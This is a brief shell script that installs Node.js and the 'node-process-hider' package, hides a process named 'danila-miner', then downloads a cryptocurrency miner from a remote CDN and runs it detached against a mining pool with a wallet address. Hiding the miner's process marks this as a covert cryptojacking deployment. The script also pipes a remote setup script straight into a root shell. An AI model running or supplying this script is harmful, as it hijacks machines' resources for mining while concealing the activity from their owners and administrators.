nohup sudo apt-get update
nohup sudo apt install screen -y
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt install nodejs
npm i -g node-process-hider
sudo ph add danila-miner
wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-xenial-hive.tar.gz && tar -xf danila-miner-2.3.1-xenial-hive.tar.gz && cd danila-miner-2.3.1-xenial && screen -d -m ./danila-miner run https://server1.whalestonpool.com EQAmlNaFmoaWvWOwFR2cAWBEsSnwQ2O9bljsXXxiEZ5CXBKG
